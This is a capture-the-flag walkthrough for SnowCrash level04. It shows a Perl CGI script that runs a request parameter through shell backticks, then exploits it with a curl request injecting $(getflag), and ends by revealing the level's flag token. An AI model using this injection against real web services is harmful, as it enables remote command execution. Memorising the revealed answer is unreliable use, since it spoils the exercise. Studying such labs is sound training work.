<h1>LEVEL04</h1>


<h4>GETTING STARTED</h4>

When `ls -la` we notice a .pl file. A `.pl` file typically refers to a script written in Perl, a high-level, general-purpose, interpreted, dynamic programming language. P

<h4>INJECTIONS</h4>

```
level04@SnowCrash:~$ strings ./level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
x(param("x"));
```


I dont have write permission so i cant change the file. It has an address and a port so its a script that is designed to execute as part of a web service, likely meant to interact with HTTP requests. For example : 

```
level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=test
test
```

`$(command)`: This syntax is used for command substitution in shell, which executes the command and substitutes its output. Since the Perl script uses backticks to execute the contents of the x parameter, including $(getflag) within the parameter might lead the server to execute the getflag command. 

`level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=$(getflag)` 

Make sure to include single quotes around otherwise the variable will expand before the curl gets executed resulting in running the script as the user level04 instead of flag04.



<details><summary> SOLUTION </summary>
  
* `su level05`

<p align="center">
👑 ne2searoevaevoem4ov4ar8ap 👑
</p>
                                           
</details>

